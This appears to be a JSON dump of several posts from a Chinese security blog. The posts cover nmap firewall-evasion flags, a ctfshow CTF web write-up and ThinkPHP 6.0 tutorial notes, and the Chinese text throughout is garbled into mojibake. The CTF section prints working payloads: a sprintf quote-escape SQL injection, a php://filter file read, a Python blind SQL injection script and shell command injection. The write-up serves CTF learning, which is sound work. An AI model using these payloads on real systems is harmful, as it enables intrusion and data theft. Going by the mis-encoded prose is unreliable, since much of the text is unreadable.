è®¾ç½®æ‰«æä¸»æœº10ç§’ åœ¨10ç§’åè¿˜æ²¡æ¥æ”¶å“åº”é‚£å°±ä¼šè®¤ä¸ºæ²¡å¼€ç«¯å£ -lt[list.txt] å¦‚æœä½ æœ‰å¤§é‡çš„ç³»ç»Ÿéœ€è¦æ‰«æ ,ä½ å¯ä»¥å°†è¿™äº›IPåœ°å€(æˆ–ä¸»æœºå)è¾“å…¥åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­ â€“script afp-brute åŠ è½½è„šæœ¬ -PS é€‰é¡¹æ¥å®æ–½TCP SYN pingå¯ç»•é˜²ç«å¢™ -PA è¿™ç§ç±»å‹çš„æ‰«æå°†åªä¼šæ‰«æACKåŒ…ã€‚å¯ç»•é˜²ç«å¢™ -PU æ‰«æåªä¼šå¯¹ç›®æ ‡è¿›è¡Œudp pingæ‰«æã€‚è¿™ç§ç±»å‹çš„æ‰«æä¼šå‘é€UDPåŒ…æ¥è·å¾—ä¸€ä¸ªå“åº”ã€‚å¯ç»•é˜²ç«å¢™ -PP é€‰é¡¹è¿›è¡Œä¸€ä¸ªICMPæ—¶é—®æˆ³pingæ‰«æ å¯ç»•é˜²ç«å¢™ -PE å‚æ•°è¿›è¡Œä¸€ä¸ªICMP(Internetæ§åˆ¶æŠ¥æ–‡åè®®) åœ¨æŒ‡å®šçš„ç³»ç»Ÿä¸Šè¾“å‡ºping,å¯ç»•é˜²ç«å¢™ -Pn ä¸é‡‡ç”¨pingæ–¹å¼è¿›è¡Œæ‰«æ å¯ç»•é˜²ç«å¢™ -sA ç”¨äºå‘ç°é˜²ç«å¢™è§„åˆ™ï¼Œæ¯”å¦‚æ‰«åˆ°çš„ç«¯å£æ˜¯è¿‡æ»¤çš„é‚£ä¹ˆå¯ä»¥ä½¿ç”¨è¿™ä¸ªå‚æ•°è¿›è¡Œç»•è¿‡ã€‚ OpenVASä¸‹è½½åç™»å½• https://127.0.0.1:9392/ sudo gvm-start //å¯åŠ¨ sudo gvm-stop //åœæ­¢ ä½¿ç”¨è¯´æ˜: https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/28.html åŸŸåéå†DirBusteråœ¨kaliä¸­cdåˆ°/usr/share/wordlists/dirbusterï¼Œè¾“å…¥å‘½ä»¤æ‰“å¼€dirbuster ç‚¹å‡»startå¼€å§‹æ‰«æ è¯¦ç»†ä»‹ç»:https://blog.csdn.net/xiao1234oaix/article/details/108277427 â€‹ https://blog.csdn.net/weixin_42380348/article/details/100700889 å¾¡å‰‘æ‰«æ Layerå­åŸŸåæŒ–æ˜æœº æŒ‡çº¹è¯†åˆ«Whatwebwhatweb -h æŸ¥çœ‹å‚æ•° -vè¾“å‡ºè¯¦ç»†å‚æ•° -aè°ƒèŠ‚æ¢æµ‹é€Ÿåº¦ httprintå¾¡å‰‘æŒ‡çº¹è¯†åˆ«åœ¨çº¿æŒ‡çº¹è¯†åˆ«http://whatweb.bugscaner.com/look/ https://www.yunsee.cn/","categories":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/categories/æ¸—é€/"}],"tags":[{"name":"ä¿¡æ¯æœé›†","slug":"ä¿¡æ¯æœé›†","permalink":"https://pp1ove.gitee.io/tags/ä¿¡æ¯æœé›†/"}],"keywords":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/categories/æ¸—é€/"}]},{"title":"ctfshow-èŒæ–°èµ›","slug":"ctfshow-èŒæ–°èµ›","date":"2021-02-07T14:07:29.000Z","updated":"2021-02-08T05:01:44.323Z","comments":true,"path":"2021/02/07/ctfshow-èŒæ–°èµ›/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/07/ctfshow-èŒæ–°èµ›/","excerpt":"","text":"ç»™å¥¹æ‰“å¼€ï¼š .gitæºç æ³„éœ²ï¼Œç›´æ¥ç”¨githackæ‰«æé¢˜ç›®åœ°å€+/.gitå‘ç°ç¡®å®å¦‚æ­¤ã€‚ &lt;?php $pass=sprintf(&quot;and pass=&#39;%s&#39;&quot;,addslashes($_GET[&#39;pass&#39;])); $sql=sprintf(&quot;select * from user where name=&#39;%s&#39;$pass&quot;,addslashes($_GET[&#39;name&#39;])); ?&gt; æœ¬æ¥æƒ³çš„æ˜¯å®½å­—èŠ‚æ³¨å…¥,ä½†æ˜¯ä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ ç„¶åè¿™é‡Œæœ‰ä¸€ä¸ªsprintfå‡½æ•°æ²¡æœ‰è§è¿‡,å°±å»ç™¾åº¦äº†ä¸€ä¸‹ç”¨æ³•å’Œç›¸å…³æ¼æ´ https://www.cnblogs.com/qingwuyou/p/10687463.html ç„¶åsprintf()æ³¨å…¥åŸç†ä¸ºï¼š è¿™é‡Œåˆ©ç”¨çš„åŸç†æ˜¯%1$\\ä¸ºç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ %1$&#39;å•å¼•å·å‰çš„è½¬ä¹‰ç¬¦ä¼šè¢«ç½®ç©ºã€‚ä»è€Œå®ç°å•å¼•å·é€ƒé€¸ äºæ˜¯æ„é€ SQLè¯­å¥ä¸º ?name=admin&amp;pass=%1$&#39; or 1=1--+ ç„¶ååˆ°äº†ä¸€ä¸ªç•Œé¢ æŸ¥çœ‹æºä»£ç  è€Œä¸”å‘ç° cookie file=666c61672e747874 è½¬æˆå­—ç¬¦ä¸²å‘ç°æ˜¯flag.txt æŸ¥çœ‹flag.txtæ–‡ä»¶ è®¿é—®flag.txtå¯¹æ¯”ä¸€ä¸‹ï¼Œå‘ç°æœ‰ç›¸åŒçš„éƒ¨åˆ†ï¼Œæ¨æµ‹è¿™é‡Œåº”è¯¥æœ‰ä¸ªæ–‡ä»¶è¯»å–æˆ–æ–‡ä»¶åŒ…å«ï¼š ç„¶åå°†cookieé‡Œçš„fileç»™åˆ é™¤ï¼Œå‘ç°ç¡®å®æœ‰file_get_content()å‡½æ•° ç›´æ¥æ„é€ /flagä¸è¡Œï¼Œç”¨php://filter/convert.base64-encode/source=/flagæç¤ºbase64ä¸è¡Œã€‚é‚£ä¹ˆå¯ä»¥ç”¨rot13è¯•è¯•ï¼š payload: php://filter/read=string.toupper|string.rot13/resource=/flag ç„¶åè§£ç ï¼Œå†è½¬æ¢ä¸ºå°å†™ ç„¶åè¿˜çœ‹åˆ°ç¾½å¸ˆå‚…ä»¬æœ‰å…¶ä»–è§£æ³• å¸ƒå°”ç›²æ³¨ æ—¢ç„¶flagåœ¨/flagä¸­ï¼Œæˆ‘ä»¬è¯•è¯•ç”¨load_file(/flag)ï¼Œå…ˆå°†/flagè½¬ä¸º16è¿›åˆ¶ payload:name=39&amp;pass=1%1$c or if(ascii(substr((select load_file(0x2f666c6167)),1,1))=102,sleep(3),1)--+ è¿™é‡Œç»™å‡ºç›²æ³¨è„šæœ¬ import requests url=&quot;https://1cde46a1-34ca-458b-82f4-f6e905716d31.chall.ctf.show/?name=39&amp;pass=1%1$c or &quot; l=&quot;&quot; s=&quot;0123456789abcdefghijklmnopqrstuvwxyz-{}&quot; for i in range(1,50): print(&quot;*&quot;) for j in s: u=url+&quot;if(ascii(substr((select load_file(0x2f666c6167)),&quot;+str(i)+&quot;,1))=&quot;+str(ord(j))+&quot;,sleep(3),1)--+&quot; #print(u) try: r = requests.get(u,timeout=(2.5,2.5)) #print(r.text) except: l+=j print(l) break ç­¾åˆ°é¢˜&lt;?php if(isset($_GET[&#39;url&#39;])){ system(&quot;curl https://&quot;.$_GET[&#39;url&#39;].&quot;.ctf.show&quot;); }else{ show_source(__FILE__); } ?&gt; å‘½ä»¤æ‰§è¡Œ ;ls; ;cat flag; å‡èµ›ç”Ÿ&lt;?php session_start(); include(&#39;config.php&#39;); if(empty($_SESSION[&#39;name&#39;])){ show_source(&quot;index.php&quot;); }else{ $name=$_SESSION[&#39;name&#39;]; $sql=&#39;select pass from user where name=&quot;&#39;.$name.&#39;&quot;&#39;; echo $sql.&quot;&lt;br /&gt;&quot;; system(&#39;4rfvbgt56yhn.sh&#39;); $query=mysqli_query($conn,$sql); $result=mysqli_fetch_assoc($query); if($name===&#39;admin&#39;){ echo &quot;admin!!!!!&quot;.&quot;&lt;br /&gt;&quot;; if(isset($_GET[&#39;c&#39;])){ preg_replace_callback(&quot;/\\w\\W*/&quot;,function(){die(&quot;not allowed!&quot;);},$_GET[&#39;c&#39;],1); echo $flag; }else{ echo &quot;you not admin&quot;; } } } ?&gt; ç„¶åæç¤ºæœ‰registerer.phpå’Œlogin.php,å‘ç°å¯ä»¥æ³¨å†Œè´¦æˆ·å’Œç™»å½• æ³¨å†Œç”¨æˆ· adminç©ºæ ¼ ç„¶åå°è¯•ä½¿ç”¨adminç™»å½•,æˆåŠŸç™»å½•ï¼ˆè¿™é‡Œç»•äº†ç‚¹å°å¼¯,æˆ‘æ¥ç€ç”¨adminç©ºæ ¼ç™»å½•ï¼Œç»“æœå‘ç°ä¸è¡Œï¼Œä»¥ä¸ºè¿™ä¸ªæ–¹æ³•è¡Œä¸é€šï¼‰ ç„¶åå°±æ˜¯é€šè¿‡æ­£åˆ™åŒ¹é… c=!æˆåŠŸé€šè¿‡ c=ç©ºä¹Ÿå¯ä»¥","categories":[{"name":"èŒæ–°èµ›","slug":"èŒæ–°èµ›","permalink":"https://pp1ove.gitee.io/categories/èŒæ–°èµ›/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://pp1ove.gitee.io/tags/ctfshow/"}],"keywords":[{"name":"èŒæ–°èµ›","slug":"èŒæ–°èµ›","permalink":"https://pp1ove.gitee.io/categories/èŒæ–°èµ›/"}]},{"title":"thinkphp6.0","slug":"thinkphp6-0","date":"2021-02-07T02:21:15.000Z","updated":"2021-02-07T08:08:07.942Z","comments":false,"path":"2021/02/07/thinkphp6-0/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/07/thinkphp6-0/","excerpt":"","text":"0x01thinkphp6.0çš„å®‰è£…å‚è€ƒ https://www.kancloud.cn/manual/thinkphp6_0/1037479 https://www.cnblogs.com/it-abu/p/13493424.html 0x02å¼€å‘è§„èŒƒä¸€ï¼å¼€å‘è§„èŒƒä¸€ï¼å¼€å‘è§„èŒƒ ThinkPHP6.0 éµå¾ªçš„æ˜¯ PSR-2 çš„å‘½åè§„èŒƒå’Œ PSR-4 çš„è‡ªåŠ¨åŠ è½½ï¼› ç›®å½•å’Œæ–‡ä»¶çš„è§„èŒƒå¦‚ä¸‹ï¼š a. ç›®å½•åï¼ˆå°å†™+ä¸‹åˆ’çº¿ï¼‰ï¼› b. ç±»åº“å’Œå‡½æ•°æ–‡ä»¶ç»Ÿä¸€ä»¥.php ä¸ºåç¼€ï¼› c. ç±»çš„æ–‡ä»¶åå‡ä»¥å‘½åç©ºé—´å®šä¹‰ï¼Œå¹¶ä¸”å‘½åç©ºé—´çš„è·¯å¾„å’Œç±»åº“æ–‡ä»¶æ‰€åœ¨è·¯å¾„ ä¸€è‡´ï¼› d. ç±»ï¼ˆåŒ…å«æ¥å£å’Œ Traitï¼‰æ–‡ä»¶é‡‡ç”¨é©¼å³°å¼å‘½åï¼ˆé¦–å­—æ¯å¤§å†™ï¼‰ï¼Œå…¶å®ƒé‡‡ç”¨ å°å†™+ä¸‹åˆ’çº¿å‘½åï¼› e. ç±»åï¼ˆåŒ…æ‹¬æ¥å£å’Œ Traitï¼‰å’Œæ–‡ä»¶åä¿æŒä¸€è‡´ï¼Œç»Ÿä¸€é‡‡ç”¨é©¼å³°å¼å‘½å ï¼ˆé¦–å­—æ¯å¤§å†™ï¼‰ï¼› å‡½æ•°å’Œç±»ã€å±æ€§å‘½åè§„èŒƒå¦‚ä¸‹ï¼š a. ç±»çš„å‘½åé‡‡ç”¨é©¼å³°æ³•ï¼ˆé¦–å­—æ¯å¤§å†™ï¼‰ï¼Œå¦‚ï¼šUserã€UserTypeï¼› b. å‡½æ•°çš„å‘½åä½¿ç”¨å°å†™å­—æ¯å’Œä¸‹åˆ’çº¿ï¼ˆå°å†™å­—æ¯å¼€å¤´ï¼‰çš„æ–¹å¼ï¼Œ å¦‚ï¼šget_client_ipï¼› c. æ–¹æ³•çš„å‘½åä½¿ç”¨é©¼å³°æ³•ï¼ˆé¦–å­—æ¯å°å†™ï¼‰ï¼Œå¦‚ï¼šgetUserNameï¼› d. å±æ€§çš„å‘½åä½¿ç”¨é©¼å³°æ³•ï¼ˆé¦–å­—æ¯å°å†™ï¼‰ï¼Œå¦‚ï¼štableNameï¼› e. ç‰¹ä¾‹ï¼šä»¥åŒä¸‹åˆ’çº¿__æ‰“å¤´çš„å‡½æ•°æˆ–æ–¹æ³•ä½œä¸ºé­”æœ¯æ–¹æ³•ï¼Œå¦‚ï¼š call å’Œ autoloadï¼› å¸¸é‡ä¸é…ç½®çš„è§„èŒƒå¦‚ä¸‹ï¼š a. å¸¸é‡ä»¥å¤§å†™å­—æ¯å’Œä¸‹åˆ’çº¿å‘½åï¼Œå¦‚ï¼šAPP_PATHï¼› b. é…ç½®å‚æ•°ä»¥å°å†™å­—æ¯å’Œä¸‹åˆ’çº¿å‘½åï¼Œå¦‚ï¼šurl_convertï¼› c. ç¯å¢ƒå˜é‡å®šä¹‰ä½¿ç”¨å¤§å†™å­—æ¯å’Œä¸‹åˆ’çº¿å‘½åï¼Œå¦‚ï¼šAPP_DEBUGï¼› æ•°æ®è¡¨å’Œå­—æ®µçš„è§„èŒƒå¦‚ä¸‹ï¼š a. æ•°æ®è¡¨å’Œå­—æ®µé‡‡ç”¨å°å†™åŠ ä¸‹åˆ’çº¿æ–¹å¼å‘½åï¼› b. å¹¶æ³¨æ„å­—æ®µåä¸è¦ä»¥ä¸‹åˆ’çº¿å¼€å¤´ï¼Œå¦‚ï¼š think_user è¡¨å’Œ user_name c. å­—æ®µä¸å»ºè®®ä½¿ç”¨é©¼å³°å’Œä¸­æ–‡ä½œä¸ºæ•°æ®è¡¨åŠå­—æ®µå‘½åï¼› äºŒï¼ç›®å½•ç»“æ„ ThinkPHP6.0 æ”¯æŒå¤šåº”ç”¨æ¨¡å¼éƒ¨ç½²ï¼Œapp æ˜¯åº”ç”¨ç›®å½•ï¼› é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯é‡‡ç”¨çš„å•æ¨¡å¼ï¼Œå¦‚ä¸‹å›¾ç»“æ„ï¼š å¤šåº”ç”¨æ¨¡å¼ä¸‹ï¼Œç»“æ„å¦‚ä¸‹å›¾ï¼š ä¸Šå›¾ä¸­ï¼Œapp_name å¯ä»¥æœ‰å¤šä¸ªï¼Œå³å¤šåº”ç”¨æ¨¡å¼ï¼› åœ¨ç›®å½•ç»“æ„ä¸Šï¼Œåªç¡®ä¿å¯¹å¤–å¯è®¿é—®çš„ä»… public ç›®å½•ï¼› åœ¨ app ç›®å½•ä¸­ï¼Œè¿˜æä¾›äº†ä¸€äº›æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶å°†åœ¨åé¢é€æ­¥è®²åˆ°ï¼› 0x03å¼€å¯è°ƒè¯•ä¸é…ç½®æ–‡ä»¶ é€šè¿‡å‘½ä»¤è¡Œå®‰è£…çš„ TP6.0ï¼Œä¼šè‡ªåŠ¨åœ¨æ ¹ç›®å½•ç”Ÿæˆä¸€ä¸ª.example..env æ–‡ä»¶ï¼› è¿™ä¸ª.env æ–‡ä»¶æ˜¯ç¯å¢ƒé…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬åªè¦åˆ é™¤å‰é¢çš„.example.å³å¯ç”Ÿæ•ˆï¼› æ­¤æ—¶ï¼Œåˆ·æ–°é¡µé¢ï¼Œå³ä¸‹è§’ä¼šå‡ºç° Trace è°ƒè¯•å°å›¾æ ‡ï¼Œè¯´æ˜è°ƒè¯•å¼€å¯äº†ï¼› æŸ¥çœ‹.env æ–‡ä»¶ï¼Œæ‰“å¼€è°ƒè¯•çš„ç¯å¢ƒå˜é‡ä¸º APP_DEBUG = trueï¼Œfalse å…³é—­ï¼› 0x04URLè®¿é—®æ¨¡å¼ ThinkPHP æ¡†æ¶éå¸¸å¤šçš„æ“ä½œéƒ½æ˜¯é€šè¿‡ URL æ¥å®ç°çš„ï¼› å¤šåº”ç”¨ï¼šhttp://serverName/index.php/åº”ç”¨/æ§åˆ¶å™¨/æ“ä½œ/å‚æ•°/å€¼â€¦ï¼› å•åº”ç”¨ï¼šhttp://serverName/index.php/æ§åˆ¶å™¨/æ“ä½œ/å‚æ•°/å€¼â€¦ï¼› ç”±äº TP6.0 é»˜è®¤æ˜¯å•åº”ç”¨æ¨¡å¼ï¼Œå¤šåº”ç”¨éœ€è¦ä½œä¸ºæ‰©å±•å®‰è£…ï¼Œé¿å…æ··ä¹±æš‚æ—¶æç½®ï¼› http://serverName æ˜¯åŸŸååœ°å€ï¼Œæ¯”å¦‚ 127.0.0.1:8000 æˆ– localhost/tp6/ index.php è¿™ä¸ªæ–‡ä»¶ï¼Œæ˜¯æ ¹ç›®å½•ä¸‹ public/ä¸‹çš„ index.php(å…¥å£æ–‡ä»¶)ï¼› æ§åˆ¶å™¨ï¼šapp ç›®å½•ä¸‹æœ‰ä¸€ä¸ª controller æ§åˆ¶å™¨ç›®å½•çš„ Test.php(æ§åˆ¶å™¨)ï¼› Test.php æ§åˆ¶å™¨çš„ç±»åä¹Ÿå¿…é¡»æ˜¯ class Testï¼Œå¦åˆ™é”™è¯¯ï¼› æ“ä½œå°±æ˜¯æ§åˆ¶å™¨ç±»é‡Œé¢çš„æ–¹æ³•ï¼Œæ¯”å¦‚ï¼šindex(é»˜è®¤å…å†™)æˆ– hello(å¿…å†™)ï¼› é‚£ä¹ˆå®Œæ•´å½¢å¼ä¸ºï¼š a. http://localhost/tp6/public/index.php/test/hello/value/world b. http://127.0.0.1:8000/index.php/test/hello/value/world class Test { public function index() { return &#39;test&#39;; } public function hello($value = &#39;&#39;) { return &#39;hello &#39;.$value; } } public/index.php ä¸­çš„ index.php å¯ä»¥çœç•¥ï¼Œåªè¦è®¾ç½® URL é‡å†™å³å¯ï¼› httpd.conf é…ç½®æ–‡ä»¶ä¸­åŠ è½½äº† mod_rewrite.so æ¨¡å—ï¼› AllowOverride None å°† None æ”¹ä¸º Allï¼› æ­¤æ—¶ï¼Œè·¯å¾„å˜æ›´ä¸ºï¼š http://localhost/tp6/public/test/hello/value/world äºŒï¼**URL å…¼å®¹æ¨¡å¼** ä¸Šä¸ªè¦ç‚¹å·²ç»äº†è§£äº† URL æ‰€æœ‰è®¿é—®è§„åˆ™ï¼Œé€šè¿‡åˆ›å»º Test æ§åˆ¶å™¨æ›´åŠ äº†è§£ï¼› å¦‚æœä¸Šé¢é‚£ç§å½¢å¼çš„ URL ä¸æ”¯æŒçš„è¯ï¼Œå¯ä»¥ä½¿ç”¨å…¼å®¹æ¨¡å¼çš„æ–¹å¼æ¥è®¿é—®ï¼š http://localhost/tp6test3/public/?s=test/hello/value/world 0x05æ§åˆ¶å™¨å®šä¹‰ä¸€ï¼æ§åˆ¶å™¨å®šä¹‰ æ§åˆ¶å™¨ï¼Œå³ controllerï¼Œæ§åˆ¶å™¨æ–‡ä»¶å­˜æ”¾åœ¨ controller ç›®å½•ä¸‹ï¼› å¦‚æœæƒ³æ”¹å˜ç³»ç»Ÿé»˜è®¤çš„æ§åˆ¶å™¨æ–‡ä»¶ç›®å½•ï¼Œå¯ä»¥åœ¨ config ä¸‹ route.php é…ç½®ï¼š â€˜controller_layerâ€™ =&gt; â€˜controller123â€™, ç±»åå’Œæ–‡ä»¶åå¤§å°å†™ä¿æŒä¸€è‡´ï¼Œå¹¶é‡‡ç”¨é©¼å³°å¼ï¼ˆé¦–å­—æ¯å¤§å†™ï¼‰ï¼› namespace app\\controller; class Test {â€¦} ä»ä¸Šé¢ä¸¤æ®µä»£ç å¾—çŸ¥ Test.php çš„å®é™…ä½ç½®ä¸ºï¼šapp\\controller\\Test.php åœ¨ Test ç±»åˆ›å»ºä¸¤ä¸ªæ–¹æ³• index(é»˜è®¤)å’Œ helloï¼Œè®¿é—® URL å¦‚ä¸‹ï¼š http://localhost/tp6/public/test/ http://localhost/tp6/public/test/hello é‚£ä¹ˆå¦‚æœåˆ›å»ºçš„æ˜¯åŒå­—æ¯ç»„åˆï¼Œæ¯”å¦‚ class HelloWorldï¼Œè®¿é—® URL å¦‚ä¸‹ï¼š http://localhost/tp6test3/public/helloworld http://localhost/tp6test3/public/hello_world å¦‚æœä½ æƒ³é¿å…å¼•å…¥åŒç±»åæ—¶çš„å†²çªï¼Œå¯ä»¥ route.php è®¾ç½®æ§åˆ¶å™¨åç¼€ï¼š â€˜controller_suffixâ€™ =&gt; true, æ­¤æ—¶ï¼ŒTest.php å°±å¿…é¡»æ”¹æˆ TestController.phpï¼Œå¹¶ç±»åä¹Ÿéœ€è¦å¢åŠ åç¼€ï¼› äºŒï¼æ¸²æŸ“è¾“å‡º ThinkPHP ç›´æ¥é‡‡ç”¨æ–¹æ³•å†… return è¿”å›çš„æ–¹å¼ç›´æ¥å°±è¾“å‡ºäº†ï¼› ä½¿ç”¨ json è¾“å‡ºï¼Œç›´æ¥é‡‡ç”¨ json å‡½æ•°ï¼› $data = array(â€˜aâ€™=&gt;1, â€˜bâ€™=&gt;2, â€˜câ€™=&gt;3); return json($data); ä¸æ¨èä½¿ç”¨ dieã€exit ç­‰ PHP æ–¹æ³•ä¸­æ–­ä»£ç æ‰§è¡Œï¼Œæ¨èåŠ©æ‰‹å‡½æ•° halt()ï¼› halt(â€˜ä¸­æ–­æµ‹è¯•â€™) 0x06åŸºç¡€.ç©º.å¤šçº§æ§åˆ¶å™¨ä¸€ï¼åŸºç¡€æ§åˆ¶å™¨ ä¸€èˆ¬æ¥è¯´ï¼Œåˆ›å»ºæ§åˆ¶å™¨åï¼Œæ¨èç»§æ‰¿åŸºç¡€æ§åˆ¶å™¨æ¥è·å¾—æ›´å¤šçš„æ–¹æ³•ï¼› åŸºç¡€æ§åˆ¶å™¨ä»…ä»…æä¾›äº†æ§åˆ¶å™¨éªŒè¯åŠŸèƒ½ï¼Œå¹¶æ³¨å…¥äº†think\\Appå’Œthink\\Requestï¼› è¿™ä¸¤ä¸ªå¯¹è±¡åé¢ä¼šæœ‰ç« èŠ‚è¯¦ç»†è®²è§£ï¼Œä¸‹é¢æˆ‘ä»¬ç»§æ‰¿å¹¶ç®€å•ä½¿ç”¨ä¸€ä¸‹ï¼› äºŒï¼ç©ºæ§åˆ¶å™¨ åœ¨å•åº”ç”¨æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç»™é¡¹ç›®å®šä¹‰ä¸€ä¸ª Error æ§åˆ¶å™¨ç±»ï¼Œæ¥æé†’é”™è¯¯ï¼› ä¸‰ï¼å¤šçº§æ§åˆ¶å™¨ æ‰€è°“å¤šçº§æ§åˆ¶å™¨ï¼Œå°±æ˜¯åœ¨æ§åˆ¶å™¨ controller ç›®å½•ä¸‹å†å»ºç«‹ç›®å½•å¹¶åˆ›å»ºæ§åˆ¶å™¨ï¼› æˆ‘ä»¬åœ¨ controller ç›®å½•ä¸‹å»ºç«‹ group ç›®å½•ï¼Œå¹¶åˆ›å»º Blog.php æ§åˆ¶å™¨ï¼› è€Œæ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦è®¿é—®çš„åœ°å€ä¸ºï¼šhttp://localhost:8000/group.blog 0x07è¿æ¥æ•°æ®åº“ä¸æ¨¡å‹åˆæ¢ä¸€ï¼è¿æ¥æ•°æ®åº“ ThinkPHP é‡‡ç”¨å†…ç½®æŠ½è±¡å±‚å°†ä¸åŒçš„æ•°æ®åº“æ“ä½œè¿›è¡Œå°è£…å¤„ç†ï¼› æ•°æ®æŠ½è±¡å±‚åŸºäº PDO æ¨¡å¼ï¼Œæ— é¡»é’ˆå¯¹ä¸åŒçš„æ•°æ®åº“ç¼–å†™ç›¸åº”çš„ä»£ç ï¼› ä½¿ç”¨æ•°æ®åº“çš„ç¬¬ä¸€æ­¥ï¼Œå°±æ˜¯è¿æ¥ä½ çš„æ•°æ®åº“ï¼› åœ¨æ ¹ç›®å½•çš„ config ä¸‹çš„ database.php å¯ä»¥è®¾ç½®æ•°æ®åº“è¿æ¥ä¿¡æ¯ï¼› å¤§éƒ¨åˆ†ç³»ç»Ÿå·²ç»ç»™äº†é»˜è®¤å€¼ï¼Œä½ åªéœ€è¦ä¿®æ”¹å’Œå¡«å†™éœ€è¦çš„å€¼å³å¯ï¼› æœ¬åœ°æµ‹è¯•ï¼Œä¼šä¼˜å…ˆé‡‡ç”¨.env çš„é…ç½®ä¿¡æ¯ï¼Œæˆ‘ä»¬å’Œ database é…ç½®å¯¹åº”ä¸Šå³å¯ï¼› â€˜typeâ€™ =&gt; Env::get(â€˜database.typeâ€™, â€˜mysqlâ€™), â€˜hostnameâ€™ =&gt; Env::get(â€˜database.hostnameâ€™, â€˜127.0.0.1â€™), â€˜databaseâ€™ =&gt; Env::get(â€˜database.databaseâ€™, â€˜gradeâ€™), â€˜usernameâ€™ =&gt; Env::get(â€˜database.usernameâ€™, â€˜rootâ€™), â€˜passwordâ€™ =&gt; Env::get(â€˜database.passwordâ€™, â€˜123456â€™), â€˜hostportâ€™ =&gt; Env::get(â€˜database.hostportâ€™, â€˜3306â€™), â€˜charsetâ€™ =&gt; Env::get(â€˜database.charsetâ€™, â€˜utf8â€™), â€˜prefixâ€™ =&gt;Env::get(â€˜database.prefixâ€™, â€˜tp_â€™), å¯ä»¥é€šè¿‡åˆ é™¤æ”¹å˜.env çš„é…ç½®ï¼Œæˆ–åˆ é™¤.env æ¥éªŒè¯ database çš„æ‰§è¡Œä¼˜å…ˆçº§ï¼› åœ¨ database.php é…ç½®ä¸­ï¼Œdefault è¡¨ç¤ºè®¾ç½®é»˜è®¤çš„æ•°æ®åº“è¿æ¥ï¼› connections é…ç½®æ•°æ®åº“è¿æ¥ä¿¡æ¯ï¼Œå¯ä»¥æ˜¯å¤šä¸ªæ•°æ®åº“ï¼Œä¾¿äºåˆ‡æ¢ï¼› é»˜è®¤çš„æ•°æ®åº“è¿æ¥åç§°ä¸ºï¼šâ€™mysqlâ€™ï¼Œå†å¤åˆ¶ä¸€ç»„æ•°æ®åº“é“¾æ¥ä¿¡æ¯ï¼šâ€™demoâ€™åˆ‡æ¢ï¼› åˆ›å»ºä¸€ä¸ªç”¨äºæµ‹è¯•æ•°æ®è¿æ¥çš„æ§åˆ¶å™¨ï¼šDataTest.phpï¼› namespace app\\controller; use think\\facade\\Db; class DataTest { public function index() { $user = Db::table(&#39;tp_user&#39;)-&gt;select(); //$user = Db::connect(&#39;mysql&#39;)-&gt;table(&#39;tp_user&#39;)-&gt;select(); return json($user); } public function demo() { $demo = Db::connect(&#39;demo&#39;)-&gt;table(&#39;tp_user&#39;)-&gt;select(); return json($demo); } } äºŒï¼æ¨¡å‹åˆæ¢ åœ¨ app ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª model ç›®å½•ï¼Œå¹¶åˆ›å»º User.php çš„æ¨¡å‹ç±»ï¼› namespace app\\model; use think\\Model; class User extends Model { protected $connection = &#39;demo&#39;; } User ç»§æ‰¿æ¨¡å‹åŸºç±»ï¼Œå³å¯å®ç°æ•°æ®è°ƒç”¨ï¼Œåé¢ç« èŠ‚ä¼šè¯¦è§£è®²è§£ï¼› è€Œå—ä¿æŠ¤çš„å­—æ®µ$connectionï¼Œåˆ™æ˜¯åˆ‡æ¢åˆ° demo æ•°æ®åº“ï¼› æ§åˆ¶å™¨ç«¯çš„è°ƒç”¨æ–¹å¼å¦‚ä¸‹ï¼Œå…·ä½“åŸç†ï¼Œåé¢æ¨¡å‹ç« èŠ‚ä¼šè¯¦è§£ï¼› public function getUser() { $user = User::select(); return json($user); } 0x08æ•°æ®åº“çš„æ•°æ®æŸ¥è¯¢ä¸€ï¼å•æ•°æ®æŸ¥è¯¢ Db::table()ä¸­ table å¿…é¡»æŒ‡å®šå®Œæ•´æ•°æ®è¡¨ï¼ˆåŒ…æ‹¬å‰ç¼€ï¼‰ï¼› å¦‚æœå¸Œæœ›åªæŸ¥è¯¢ä¸€æ¡æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ find()æ–¹æ³•ï¼Œéœ€æŒ‡å®š where æ¡ä»¶ï¼› Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;, 27)-&gt;find() Db::getLastSql()æ–¹æ³•ï¼Œå¯ä»¥å¾—åˆ°æœ€è¿‘ä¸€æ¡ SQL æŸ¥è¯¢çš„åŸç”Ÿè¯­å¥ï¼› SELECT * FROM `tp_user` LIMIT 1 æ²¡æœ‰æŸ¥è¯¢åˆ°ä»»ä½•å€¼ï¼Œåˆ™è¿”å› nullï¼› ä½¿ç”¨ findOrFail()æ–¹æ³•åŒæ ·å¯ä»¥æŸ¥è¯¢ä¸€æ¡æ•°æ®ï¼Œåœ¨æ²¡æœ‰æ•°æ®æ—¶æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼› Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;, 1)-&gt;findOrFail() ä½¿ç”¨ findOrEmpty()æ–¹æ³•ä¹Ÿå¯ä»¥æŸ¥è¯¢ä¸€æ¡æ•°æ®ï¼Œä½†åœ¨æ²¡æœ‰æ•°æ®æ—¶è¿”å›ä¸€ä¸ªç©ºæ•°ç»„ï¼› Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;, 1)-&gt;findOrEmpty(); äºŒï¼æ•°æ®é›†æŸ¥è¯¢ æƒ³è¦è·å–å¤šåˆ—æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ select()æ–¹æ³•ï¼› 